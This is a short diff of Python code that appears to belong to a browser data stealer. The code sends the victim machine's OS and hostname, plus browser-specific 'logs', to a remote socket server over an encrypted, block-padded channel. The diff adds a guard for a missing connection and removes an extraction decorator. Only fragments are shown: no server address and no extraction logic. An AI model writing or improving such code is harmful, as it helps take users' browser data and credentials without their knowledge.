@@ -45,7 +45,7 @@ def socket_initialise() -> None:
         'cipher': cipher,
     }
 
-    # send client info
+    # send client info to server
     socket_send_data({
         'os': sys.platform,
         'computer': socket.gethostname(),
@@ -65,6 +65,10 @@ def split_blocks(foo: bytes, block_size: int):
 
 def socket_send_data(data: dict) -> None:
     """ Send data to socket server """
+    # no socket connection
+    if not socket_info['client']:
+        return
+    
     # encode data
     encoded_data = json.dumps(data).encode(FORMAT)
 
@@ -88,7 +92,6 @@ def socket_send_data(data: dict) -> None:
         client.send(encrypted_block + padding)
 
 
-@try_extract
 def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
     """ Send log to socket server """
     socket_send_data({
